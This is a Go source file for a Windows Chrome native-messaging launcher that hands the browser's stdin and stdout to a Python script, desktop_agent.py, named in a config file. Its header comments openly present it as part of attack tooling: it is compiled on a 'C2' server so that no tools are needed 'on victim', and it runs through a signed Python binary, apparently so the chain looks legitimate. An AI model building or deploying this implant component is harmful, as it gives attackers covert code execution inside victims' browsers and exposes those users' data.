// launcher_windows — stdin/stdout bridge for Chrome native messaging on Windows.
//
// Chrome's native messaging manifest only supports a single "path" field with
// no arguments. This launcher reads python.exe path and script from launcher.cfg
// (written by install.py), then execs them with pipes wired to Chrome's stdio.
//
// Process tree:  Chrome → launcher.exe → python.exe (signed PSF binary)
//
// Build from C2 (Linux → Windows cross-compile, no tools on victim):
//   cd native_host/launcher_windows
//   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o ../launcher.exe .
//
// launcher.cfg format (written by install.py):
//   python=C:\Users\...\Python312\python.exe
//   script=desktop_agent.py
package main

import (
	"bufio"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func readCfg(path string) map[string]string {
	m := make(map[string]string)
	f, err := os.Open(path)
	if err != nil {
		return m
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if parts := strings.SplitN(line, "=", 2); len(parts) == 2 {
			m[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	return m
}

func main() {
	dir, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	cfg    := readCfg(filepath.Join(dir, "launcher.cfg"))

	pyExe  := cfg["python"]
	script := filepath.Join(dir, cfg["script"])
	if pyExe == "" || cfg["script"] == "" {
		os.Exit(1)
	}

	// Wire Chrome's stdio directly to Python — no buffering, no goroutines.
	// Python reads the 4-byte length-prefixed native messaging frames from
	// Chrome's stdout and writes responses back; we just connect the pipes.
	cmd := exec.Command(pyExe, script)
	cmd.Stdin  = os.Stdin
	cmd.Stdout = os.Stdout
	// Stderr suppressed — Chrome native messaging does not use it.

	if err := cmd.Run(); err != nil {
		os.Exit(1)
	}
}
